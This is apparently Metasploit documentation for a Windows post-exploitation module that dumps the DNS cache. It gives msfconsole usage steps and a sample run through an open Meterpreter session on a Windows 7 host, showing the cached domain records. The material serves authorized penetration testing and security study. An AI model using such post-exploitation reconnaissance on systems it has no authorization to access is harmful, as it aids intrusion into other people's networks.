## Vulnerable Application

This module displays the records stored in the DNS cache.

## Verification Steps
  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/dnscache_dump```
  4. Do: ```set SESSION <session id>```
  6. Do: ```run```

## Options

  ***
  SESSION
  ***
  The session to run this module on.


## Scenarios

### A run on Windows 7 (6.1 Build 7601, Service Pack 1).

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.6:49184) at 2019-12-11 12:51:59 -0700

  msf > use post/windows/gather/dnscache_dump
  msf post(windows/gather/dnscache_dump) > set SESSION 1
    SESSION => 1
  msf post(windows/gather/dnscache_dump) > run

    [*] DNS Cached Entries
    ==================

    TYPE  DOMAIN
    ----  ------
    0001  dc.domain.local
    0001  watson.microsoft.com
    0005  download.windowsupdate.com
    0005  go.microsoft.com
    0005  www.msftncsi.com
    0005  download.microsoft.com
    00ff  isatap
    00ff  wpad
    00ff  _ldap._tcp.dc.domain.local
    00ff  _ldap._tcp.default-first-site-name._sites.dc.domain.local

    [*] Post module execution completed
    ```
